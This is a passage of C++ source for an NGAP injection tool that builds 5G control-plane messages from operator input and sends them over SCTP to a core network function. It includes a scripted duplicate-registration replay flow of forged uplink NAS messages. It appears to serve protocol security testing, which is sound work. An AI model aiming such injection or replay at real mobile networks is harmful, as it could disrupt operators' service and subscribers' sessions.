      print_confirmation("HandoverRequired", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                               {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                               {"Cause", cause},
                                               {"Target-gNB-ID", default_to_string(target_gnb)},
                                               {"Handover-Type", ho_type},
                                               {"Target-PLMN", plmn},
                                               {"Target-TAC", tac},
                                               {"PDU-Session-ID", default_to_string(pdu_session_id)},
                                               {"QFI", default_to_string(static_cast<unsigned>(qfi))},
                                               {"RRC-HO-Prep-Container-Octets", default_to_string(rrc_container.length())}});
      return single(injectable_ngap_pdu{
          build_handover_required(amf_id, ran_id, cause, target_gnb, ho_type, plmn, tac, pdu_session_id, qfi, std::move(rrc_container)),
          "HandoverRequired"});
    }
    case ue_message_type::handover_request_acknowledge: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const auto        psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        teid   = static_cast<uint32_t>(read_uint64_or_default("TEID", 1, 0xffffffffULL));
      const std::string addr   = read_ipv4_or_default("Transport Layer Address", "127.0.0.1");
      const auto        qfi    = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      const std::string rrc_container_hex = read_valid_hex_or_default("RRC handover command container hex", default_rrc_handover_command_container_hex);
      print_confirmation("HandoverRequestAcknowledge", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                          {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                          {"PDU-Session-ID", default_to_string(psi)},
                                                          {"TEID", default_to_string(teid)},
                                                          {"TransportLayerAddress", addr},
                                                          {"QFI", default_to_string(static_cast<unsigned>(qfi))},
                                                          {"RRC-HandoverCommand-Container", rrc_container_hex}});
      return single(injectable_ngap_pdu{build_handover_request_acknowledge(
                                             amf_id,
                                             ran_id,
                                             psi,
                                             teid,
                                             addr,
                                             qfi,
                                             build_target_to_source_transparent_container(rrc_container_hex)),
                                         "HandoverRequestAcknowledge"});
    }
    case ue_message_type::handover_failure: {
      const uint64_t    amf_id = read_amf_id();
      const std::string cause  = get_input_or_default<std::string>("Cause", "ho-failure-in-target-5gc-ngran-node-or-target-system");
      const std::string container_hex = read_valid_hex_or_default("Target-to-source failure transparent container hex", "");
      print_confirmation("HandoverFailure", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                              {"Cause", cause},
                                              {"TargetToSourceFailureTransparentContainer", container_hex}});
      return single(injectable_ngap_pdu{build_handover_failure(amf_id, cause, make_hex_byte_buffer_or_throw(container_hex)),
                                         "HandoverFailure"});
    }
    case ue_message_type::handover_cancel: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string cause  = get_input_or_default<std::string>("Cause", "handover-cancelled");
      print_confirmation("HandoverCancel", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                             {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                             {"Cause", cause}});
      return single(injectable_ngap_pdu{build_handover_cancel(amf_id, ran_id, cause), "HandoverCancel"});
    }
    case ue_message_type::path_switch_request: {
      const uint64_t    amf_id   = read_amf_id();
      const uint64_t    ran_id   = read_ran_id();
      const auto        psi      = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        teid     = static_cast<uint32_t>(read_uint64_or_default("TEID", 1, 0xffffffffULL));
      const std::string addr     = read_ipv4_or_default("Transport Layer Address", "127.0.0.1");
      const auto        qfi      = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      const std::string plmn     = read_plmn_or_default("PLMN", "00f110");
      const std::string tac      = read_tac_or_default("TAC", "000007");
      print_confirmation("PathSwitchRequest", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                {"PDU-Session-ID", default_to_string(psi)},
                                                {"TEID", default_to_string(teid)},
                                                {"TransportLayerAddress", addr},
                                                {"QFI", default_to_string(static_cast<unsigned>(qfi))},
                                                {"PLMN", plmn},
                                                {"TAC", tac}});
      return single(injectable_ngap_pdu{build_path_switch_request(amf_id, ran_id, psi, teid, addr, qfi, plmn, tac),
                                 "PathSwitchRequest"});
    }
    case ue_message_type::initial_ue_message: {
      const uint64_t    ran_id  = read_ran_id();
      const std::string nas_hex = read_valid_hex_or_default("NAS PDU hex", "00");
      const std::string tac     = read_tac_or_default("TAC", "000007");
      const std::string plmn    = read_plmn_or_default("PLMN", "00f110");
      const std::string cause   = get_input_or_default<std::string>("RRC Establishment Cause", "mo-sig");
      print_confirmation("InitialUEMessage", {{"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                               {"NAS-PDU", nas_hex},
                                               {"TAC", tac},
                                               {"PLMN", plmn},
                                               {"RRCEstablishmentCause", cause}});
      return single(injectable_ngap_pdu{build_initial_ue_message(ran_id, make_hex_byte_buffer_or_throw(nas_hex), tac, plmn, cause),
                                         "InitialUEMessage"});
    }
    case ue_message_type::initial_context_setup_response: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const auto        psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        teid   = static_cast<uint32_t>(read_uint64_or_default("TEID", 1, 0xffffffffULL));
      const std::string addr   = read_ipv4_or_default("Transport Layer Address", "127.0.0.1");
      const auto        qfi    = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      print_confirmation("InitialContextSetupResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                          {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                          {"PDU-Session-ID", default_to_string(psi)},
                                                          {"TEID", default_to_string(teid)},
                                                          {"TransportLayerAddress", addr},
                                                          {"QFI", default_to_string(static_cast<unsigned>(qfi))}});
      return single(injectable_ngap_pdu{build_initial_context_setup_response(amf_id, ran_id, psi, teid, addr, qfi),
                                         "InitialContextSetupResponse"});
    }
    case ue_message_type::ue_radio_capability_info_indication: {
      const uint64_t    amf_id  = read_amf_id();
      const uint64_t    ran_id  = read_ran_id();
      const std::string cap_hex = read_valid_hex_or_default("UE Radio Capability hex", "00");
      print_confirmation("UERadioCapabilityInfoIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                              {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                              {"UE-Radio-Capability", cap_hex}});
      return single(injectable_ngap_pdu{
          build_ue_radio_capability_info_indication(amf_id, ran_id, make_hex_byte_buffer_or_throw(cap_hex)),
          "UERadioCapabilityInfoIndication"});
    }
    case ue_message_type::initial_context_setup_failure: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string cause  = get_input_or_default<std::string>("Cause", "radio-connection-with-ue-lost");
      print_confirmation("InitialContextSetupFailure", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                         {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                         {"Cause", cause}});
      return single(injectable_ngap_pdu{build_initial_context_setup_failure(amf_id, ran_id, cause),
                                         "InitialContextSetupFailure"});
    }
    case ue_message_type::ue_context_release_complete: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      print_confirmation("UEContextReleaseComplete", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                       {"RAN-UE-NGAP-ID", default_to_string(ran_id)}});
      return single(injectable_ngap_pdu{build_ue_context_release_complete(amf_id, ran_id),
                                         "UEContextReleaseComplete"});
    }
    case ue_message_type::ue_context_modification_response: {
      const uint64_t    amf_id    = read_amf_id();
      const uint64_t    ran_id    = read_ran_id();
      const std::string rrc_state = get_input_or_default<std::string>("RRC State", "connected");
      const std::string plmn      = read_plmn_or_default("PLMN", "00f110");
      const std::string tac       = read_tac_or_default("TAC", "000007");
      print_confirmation("UEContextModificationResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                            {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                            {"RRC-State", rrc_state},
                                                            {"PLMN", plmn},
                                                            {"TAC", tac}});
      return single(injectable_ngap_pdu{build_ue_context_modification_response(amf_id, ran_id, rrc_state, plmn, tac),
                                         "UEContextModificationResponse"});
    }
    case ue_message_type::ue_context_modification_failure: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string cause  = get_input_or_default<std::string>("Cause", "radio-connection-with-ue-lost");
      print_confirmation("UEContextModificationFailure", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                           {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                           {"Cause", cause}});
      return single(injectable_ngap_pdu{build_ue_context_modification_failure(amf_id, ran_id, cause),
                                         "UEContextModificationFailure"});
    }
    case ue_message_type::rrc_inactive_transition_report: {
      const uint64_t    amf_id    = read_amf_id();
      const uint64_t    ran_id    = read_ran_id();
      const std::string rrc_state = get_input_or_default<std::string>("RRC State", "inactive");
      const std::string plmn      = read_plmn_or_default("PLMN", "00f110");
      const std::string tac       = read_tac_or_default("TAC", "000007");
      print_confirmation("RRCInactiveTransitionReport", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                          {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                          {"RRC-State", rrc_state},
                                                          {"PLMN", plmn},
                                                          {"TAC", tac}});
      return single(injectable_ngap_pdu{build_rrc_inactive_transition_report(amf_id, ran_id, rrc_state, plmn, tac),
                                         "RRCInactiveTransitionReport"});
    }
    case ue_message_type::ue_context_suspend_request: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const bool        include_location = get_input_or_default<bool>("Include User Location Info", true);
      const std::string plmn   = include_location ? read_plmn_or_default("PLMN", "00f110") : "";
      const std::string tac    = include_location ? read_tac_or_default("TAC", "000007") : "";
      print_confirmation("UEContextSuspendRequest", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                       {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                       {"UserLocationInfo", include_location ? "Y" : "N"},
                                                       {"PLMN", plmn},
                                                       {"TAC", tac}});
      return single(injectable_ngap_pdu{build_ue_context_suspend_request(amf_id, ran_id, include_location, plmn, tac),
                                         "UEContextSuspendRequest"});
    }
    case ue_message_type::ue_context_resume_request: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string rrc_resume_cause = get_input_or_default<std::string>("RRC Resume Cause", "mo-sig");
      const bool        include_location = get_input_or_default<bool>("Include User Location Info", true);
      const std::string plmn   = include_location ? read_plmn_or_default("PLMN", "00f110") : "";
      const std::string tac    = include_location ? read_tac_or_default("TAC", "000007") : "";
      print_confirmation("UEContextResumeRequest", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                      {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                      {"RRC-Resume-Cause", rrc_resume_cause},
                                                      {"UserLocationInfo", include_location ? "Y" : "N"},
                                                      {"PLMN", plmn},
                                                      {"TAC", tac}});
      return single(injectable_ngap_pdu{build_ue_context_resume_request(amf_id, ran_id, rrc_resume_cause, include_location, plmn, tac),
                                         "UEContextResumeRequest"});
    }
    case ue_message_type::ran_cp_relocation_indication: {
      const uint64_t    ran_id      = read_ran_id();
      const auto        amf_set_id  = static_cast<uint16_t>(read_uint64_or_default("AMF Set ID", 1, 1023));
      const auto        amf_pointer = static_cast<uint8_t>(read_uint64_or_default("AMF Pointer", 0, 63));
      const std::string tmsi        = read_fixed_hex_or_default("5G-TMSI hex", "00000001", 4);
      const std::string plmn        = read_plmn_or_default("PLMN", "00f110");
      const std::string tac         = read_tac_or_default("TAC", "000007");
      const auto        eutra_cell  = static_cast<uint32_t>(read_uint64_or_default("EUTRA Cell ID", 1, 0x0fffffffULL));
      const auto        ul_mac      = static_cast<uint16_t>(read_uint64_or_default("UL NAS MAC", 0, 0xffff));
      const auto        ul_count    = static_cast<uint8_t>(read_uint64_or_default("UL NAS Count", 0, 31));
      print_confirmation("RANCPRelocationIndication", {{"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                        {"AMF-Set-ID", default_to_string(amf_set_id)},
                                                        {"AMF-Pointer", default_to_string(static_cast<unsigned>(amf_pointer))},
                                                        {"5G-TMSI", tmsi},
                                                        {"PLMN", plmn},
                                                        {"TAC", tac},
                                                        {"EUTRA-Cell-ID", default_to_string(eutra_cell)},
                                                        {"UL-NAS-MAC", default_to_string(ul_mac)},
                                                        {"UL-NAS-Count", default_to_string(static_cast<unsigned>(ul_count))}});
      return single(injectable_ngap_pdu{build_ran_cp_relocation_indication(ran_id, amf_set_id, amf_pointer, tmsi, plmn, tac, eutra_cell, ul_mac, ul_count),
                                         "RANCPRelocationIndication"});
    }
    case ue_message_type::pdu_session_resource_setup_response: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const auto        psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        teid   = static_cast<uint32_t>(read_uint64_or_default("TEID", 1, 0xffffffffULL));
      const std::string addr   = read_ipv4_or_default("Transport Layer Address", "127.0.0.1");
      const auto        qfi    = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      print_confirmation("PDUSessionResourceSetupResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                              {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                              {"PDU-Session-ID", default_to_string(psi)},
                                                              {"TEID", default_to_string(teid)},
                                                              {"TransportLayerAddress", addr},
                                                              {"QFI", default_to_string(static_cast<unsigned>(qfi))}});
      return single(injectable_ngap_pdu{build_pdu_session_resource_setup_response(amf_id, ran_id, psi, teid, addr, qfi),
                                         "PDUSessionResourceSetupResponse"});
    }
    case ue_message_type::pdu_session_resource_modify_response: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      const auto     psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto     qfi    = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      print_confirmation("PDUSessionResourceModifyResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                               {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                               {"PDU-Session-ID", default_to_string(psi)},
                                                               {"QFI", default_to_string(static_cast<unsigned>(qfi))}});
      return single(injectable_ngap_pdu{build_pdu_session_resource_modify_response(amf_id, ran_id, psi, qfi),
                                         "PDUSessionResourceModifyResponse"});
    }
    case ue_message_type::pdu_session_resource_modify_indication: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const auto        psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        teid   = static_cast<uint32_t>(read_uint64_or_default("TEID", 1, 0xffffffffULL));
      const std::string addr   = read_ipv4_or_default("Transport Layer Address", "127.0.0.1");
      const auto        qfi    = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      print_confirmation("PDUSessionResourceModifyIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                                 {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                                 {"PDU-Session-ID", default_to_string(psi)},
                                                                 {"TEID", default_to_string(teid)},
                                                                 {"TransportLayerAddress", addr},
                                                                 {"QFI", default_to_string(static_cast<unsigned>(qfi))}});
      return single(injectable_ngap_pdu{build_pdu_session_resource_modify_indication(amf_id, ran_id, psi, teid, addr, qfi),
                                         "PDUSessionResourceModifyIndication"});
    }
    case ue_message_type::ue_radio_capability_check_response: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      const bool     ims    = get_input_or_default<bool>("IMS Voice Support", true);
      print_confirmation("UERadioCapabilityCheckResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                             {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                             {"IMS-Voice-Support", ims ? "supported" : "not-supported"}});
      return single(injectable_ngap_pdu{build_ue_radio_capability_check_response(amf_id, ran_id, ims),
                                         "UERadioCapabilityCheckResponse"});
    }
    case ue_message_type::ue_radio_capability_id_mapping_response: {
      const std::string cap_id_hex = read_valid_hex_or_default("UE Radio Capability ID hex", "00");
      const std::string cap_hex    = read_valid_hex_or_default("UE Radio Capability hex", "00");
      print_confirmation("UERadioCapabilityIDMappingResponse", {{"UE-Radio-Capability-ID", cap_id_hex},
                                                                 {"UE-Radio-Capability", cap_hex}});
      return single(injectable_ngap_pdu{
          build_ue_radio_capability_id_mapping_response(cap_id_hex, make_hex_byte_buffer_or_throw(cap_hex)),
          "UERadioCapabilityIDMappingResponse"});
    }
    case ue_message_type::location_report: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string plmn   = read_plmn_or_default("PLMN", "00f110");
      const std::string tac    = read_tac_or_default("TAC", "000007");
      const std::string event  = get_input_or_default<std::string>("Location Event Type", "direct");
      print_confirmation("LocationReport", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                             {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                             {"PLMN", plmn},
                                             {"TAC", tac},
                                             {"EventType", event}});
      return single(injectable_ngap_pdu{build_location_report(amf_id, ran_id, plmn, tac, event), "LocationReport"});
    }
    case ue_message_type::location_reporting_failure_indication: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string cause  = get_input_or_default<std::string>("Cause", "radio-connection-with-ue-lost");
      print_confirmation("LocationReportingFailureIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                                 {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                                 {"Cause", cause}});
      return single(injectable_ngap_pdu{build_location_reporting_failure_indication(amf_id, ran_id, cause),
                                         "LocationReportingFailureIndication"});
    }
    case ue_message_type::handover_notify: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string plmn   = read_plmn_or_default("PLMN", "00f110");
      const std::string tac    = read_tac_or_default("TAC", "000007");
      print_confirmation("HandoverNotify", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                             {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                             {"PLMN", plmn},
                                             {"TAC", tac}});
      return single(injectable_ngap_pdu{build_handover_notify(amf_id, ran_id, plmn, tac), "HandoverNotify"});
    }
    case ue_message_type::uplink_ran_status_transfer: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      const auto     drb_id = static_cast<uint8_t>(read_uint64_or_default("DRB ID", 1, 32));
      const auto     ul_hfn = static_cast<uint32_t>(read_uint64_or_default("UL HFN", 0, 0xfffff));
      const auto     ul_sn  = static_cast<uint16_t>(read_uint64_or_default("UL PDCP SN", 0, 4095));
      const auto     dl_hfn = static_cast<uint32_t>(read_uint64_or_default("DL HFN", 0, 0xfffff));
      const auto     dl_sn  = static_cast<uint16_t>(read_uint64_or_default("DL PDCP SN", 0, 4095));
      print_confirmation("UplinkRANStatusTransfer", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                      {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                      {"DRB-ID", default_to_string(static_cast<unsigned>(drb_id))},
                                                      {"UL-HFN", default_to_string(ul_hfn)},
                                                      {"UL-PDCP-SN", default_to_string(ul_sn)},
                                                      {"DL-HFN", default_to_string(dl_hfn)},
                                                      {"DL-PDCP-SN", default_to_string(dl_sn)}});
      return single(injectable_ngap_pdu{build_uplink_ran_status_transfer(amf_id, ran_id, drb_id, ul_hfn, ul_sn, dl_hfn, dl_sn),
                                         "UplinkRANStatusTransfer"});
    }
    case ue_message_type::uplink_ran_early_status_transfer: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      const auto     drb_id = static_cast<uint8_t>(read_uint64_or_default("DRB ID", 1, 32));
      const auto     dl_hfn = static_cast<uint32_t>(read_uint64_or_default("First DL HFN", 0, 0xfffff));
      const auto     dl_sn  = static_cast<uint16_t>(read_uint64_or_default("First DL PDCP SN", 0, 4095));
      print_confirmation("UplinkRANEarlyStatusTransfer", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                           {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                           {"DRB-ID", default_to_string(static_cast<unsigned>(drb_id))},
                                                           {"First-DL-HFN", default_to_string(dl_hfn)},
                                                           {"First-DL-PDCP-SN", default_to_string(dl_sn)}});
      return single(injectable_ngap_pdu{build_uplink_ran_early_status_transfer(amf_id, ran_id, drb_id, dl_hfn, dl_sn),
                                         "UplinkRANEarlyStatusTransfer"});
    }
    case ue_message_type::trace_failure_indication: {
      const uint64_t    amf_id   = read_amf_id();
      const uint64_t    ran_id   = read_ran_id();
      const std::string trace_id = read_fixed_hex_or_default("NG-RAN Trace ID hex", "0000000000000000", 8);
      const std::string cause    = get_input_or_default<std::string>("Cause", "radio-connection-with-ue-lost");
      print_confirmation("TraceFailureIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                     {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                     {"NG-RAN-Trace-ID", trace_id},
                                                     {"Cause", cause}});
      return single(injectable_ngap_pdu{build_trace_failure_indication(amf_id, ran_id, trace_id, cause),
                                         "TraceFailureIndication"});
    }
    case ue_message_type::cell_traffic_trace: {
      const uint64_t    amf_id   = read_amf_id();
      const uint64_t    ran_id   = read_ran_id();
      const std::string trace_id = read_fixed_hex_or_default("NG-RAN Trace ID hex", "0000000000000000", 8);
      const std::string plmn     = read_plmn_or_default("PLMN", "00f110");
      const std::string addr     = read_ipv4_or_default("Trace Collection Entity IP", "127.0.0.1");
      const bool        privacy  = get_input_or_default<bool>("Privacy Immediate MDT", true);
      print_confirmation("CellTrafficTrace", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                               {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                               {"NG-RAN-Trace-ID", trace_id},
                                               {"PLMN", plmn},
                                               {"TraceCollectionEntityIP", addr},
                                               {"Privacy", privacy ? "immediateMDT" : "loggedMDT"}});
      return single(injectable_ngap_pdu{build_cell_traffic_trace(amf_id, ran_id, trace_id, plmn, addr, privacy),
                                         "CellTrafficTrace"});
    }
    case ue_message_type::secondary_rat_data_usage_report: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const auto        psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const bool        ho_flag = get_input_or_default<bool>("Include HO Flag", false);
      const bool        include_location = get_input_or_default<bool>("Include User Location Info", true);
      const std::string plmn   = include_location ? read_plmn_or_default("PLMN", "00f110") : "";
      const std::string tac    = include_location ? read_tac_or_default("TAC", "000007") : "";
      print_confirmation("SecondaryRATDataUsageReport", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                           {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                           {"PDU-Session-ID", default_to_string(psi)},
                                                           {"HO-Flag", ho_flag ? "ho-prep" : "not-present"},
                                                           {"UserLocationInfo", include_location ? "Y" : "N"},
                                                           {"PLMN", plmn},
                                                           {"TAC", tac}});
      return single(injectable_ngap_pdu{build_secondary_rat_data_usage_report(amf_id,
                                                                               ran_id,
                                                                               psi,
                                                                               ho_flag,
                                                                               include_location,
                                                                               plmn,
                                                                               tac),
                                         "SecondaryRATDataUsageReport"});
    }
    case ue_message_type::duplicate_registration_replay_flow: {
      std::vector<injectable_ngap_pdu> pdus;
      const uint64_t ran_id = read_ran_id();
      const uint64_t amf_id = read_amf_id();
      const uint64_t ul_ran_id = read_uint64_or_default("Uplink RAN UE NGAP ID", ran_id, max_ran_ue_ngap_id);
      const std::string tac = read_tac_or_default("TAC", "000007");
      const std::string plmn = read_plmn_or_default("PLMN", "00f110");
      const std::string rrc_cause = get_input_or_default<std::string>("RRC Establishment Cause", "mo-sig");
      const auto wait_timeout_ms = static_cast<int>(read_uint64_or_default("AMF wait timeout ms", 10000, 600000));
      const auto inter_send_delay_ms = static_cast<int>(read_uint64_or_default("Inter-send delay ms", 0, 600000));

      const std::string registration_request_hex = read_valid_hex_or_default("1 Registration Request NAS PDU hex", "00");
      const std::string authentication_response_hex = read_valid_hex_or_default("3 Authentication Response NAS PDU hex", "00");
      const std::string security_mode_complete_hex = read_valid_hex_or_default("5 Security Mode Complete NAS PDU hex", "00");
      const std::string post_context_uplink_nas_hex_1 = read_valid_hex_or_default("8 Uplink NAS PDU hex #1", "00");
      const std::string post_context_uplink_nas_hex_2 = read_valid_hex_or_default("8 Uplink NAS PDU hex #2", "00");
      const std::string final_uplink_nas_hex = read_valid_hex_or_default("12 Final Uplink NAS PDU hex", "00");
      const std::string ue_radio_capability_hex = read_valid_hex_or_default("8 UE Radio Capability hex", "00");

      const auto pdu_session_id = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto qfi = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      const auto teid = static_cast<uint32_t>(read_uint64_or_default("Response TEID", 1, 0xffffffffULL));
      const std::string transport_layer_address = read_ipv4_or_default("Response Transport Layer Address", "127.0.0.1");

      pdus.push_back({build_initial_ue_message(ran_id, make_hex_byte_buffer_or_throw(registration_request_hex), tac, plmn, rrc_cause),
                      "InitialUEMessage"});
      pdus.push_back({build_uplink_nas_transport(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(authentication_response_hex)),
                      "UplinkNASTransport(AuthenticationResponse)",
                      inter_send_delay_ms,
                      "DownlinkNASTransport(AuthenticationRequest)",
                      wait_timeout_ms});
      pdus.push_back({build_uplink_nas_transport(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(security_mode_complete_hex)),
                      "UplinkNASTransport(SecurityModeComplete)",
                      inter_send_delay_ms,
                      "DownlinkNASTransport(SecurityModeCommand)",
                      wait_timeout_ms});
      pdus.push_back({build_initial_context_setup_response(amf_id, ul_ran_id, 1, 1, "127.0.0.1", 1),
                      "InitialContextSetupResponse",
                      inter_send_delay_ms,
                      "InitialContextSetupRequest",
                      wait_timeout_ms});
      pdus.push_back({build_ue_radio_capability_info_indication(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(ue_radio_capability_hex)),
                      "UERadioCapabilityInfoIndication",
                      inter_send_delay_ms});
      pdus.push_back({build_uplink_nas_transport(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(post_context_uplink_nas_hex_1)),
                      "UplinkNASTransport(PostContext#1)",
                      inter_send_delay_ms});
      pdus.push_back({build_uplink_nas_transport(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(post_context_uplink_nas_hex_2)),
                      "UplinkNASTransport(PostContext#2)",
                      inter_send_delay_ms});

      injectable_ngap_pdu wait_for_dl_nas_after_context = {};
      wait_for_dl_nas_after_context.pdu = byte_buffer{byte_buffer::fallback_allocation_tag{}};
      wait_for_dl_nas_after_context.name = nullptr;
      wait_for_dl_nas_after_context.wait_for_amf_before_send = "DownlinkNASTransport(PostContext)";
      wait_for_dl_nas_after_context.amf_wait_timeout_ms = wait_timeout_ms;
      pdus.push_back(std::move(wait_for_dl_nas_after_context));

      pdus.push_back({build_pdu_session_resource_setup_response(amf_id,
                                                                ul_ran_id,
                                                                pdu_session_id,
                                                                teid,
                                                                transport_layer_address,
                                                                qfi),
                      "PDUSessionResourceSetupResponse",
                      inter_send_delay_ms,
                      "PDUSessionResourceSetupRequest",
                      wait_timeout_ms});
      pdus.push_back({build_uplink_nas_transport(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(final_uplink_nas_hex)),
                      "UplinkNASTransport(Final)",
                      inter_send_delay_ms});

      print_confirmation("DuplicateRegistrationReplayFlow", {{"Initial-RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                              {"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                              {"Uplink-RAN-UE-NGAP-ID", default_to_string(ul_ran_id)},
                                                              {"PLMN", plmn},
                                                              {"TAC", tac},
                                                              {"PDU-Session-ID", default_to_string(pdu_session_id)},
                                                              {"QFI", default_to_string(static_cast<unsigned>(qfi))},
                                                              {"Response-TEID", default_to_string(teid)},
                                                              {"Response-TLA", transport_layer_address},
                                                              {"AMF-wait-timeout-ms", default_to_string(wait_timeout_ms)},
                                                              {"Total-gNB-PDUs", default_to_string(pdus.size())}});
      return pdus;
    }
  }

  return std::nullopt;
}

static void send_ngap_pdu(sctp_socket&            socket,
                          sockaddr_storage&       destination,
                          const byte_buffer&      pdu,
                          const char*             pdu_name,
                          const probe_config&     cfg)
{
  std::printf("NGAP injector: packed %s length=%zu bytes\n", pdu_name, static_cast<size_t>(pdu.length()));
  if (cfg.dump_pdu_hex) {
    std::printf("NGAP injector: packed %s hex=", pdu_name);
    dump_hex(pdu);
  }

  if (pdu.length() > network_gateway_sctp_mtu) {
    throw std::runtime_error(std::string("Packed ") + pdu_name + " exceeds SCTP gateway maximum PDU length");
  }

  std::array<uint8_t, network_gateway_sctp_mtu> send_buffer = {};
  span<const uint8_t>                            pdu_span    = to_span(pdu, send_buffer);
  const int bytes_sent = ::sctp_sendmsg(socket.fd().value(),
                                        pdu_span.data(),
                                        pdu_span.size(),
                                        reinterpret_cast<sockaddr*>(&destination),
                                        sockaddr_len(destination),
                                        htonl(NGAP_PPID),
                                        0,
                                        stream_no,
                                        0,
                                        0);
  if (bytes_sent < 0) {
    throw std::runtime_error(std::string("Failed to send ") + pdu_name + ": " + std::strerror(errno));
  }
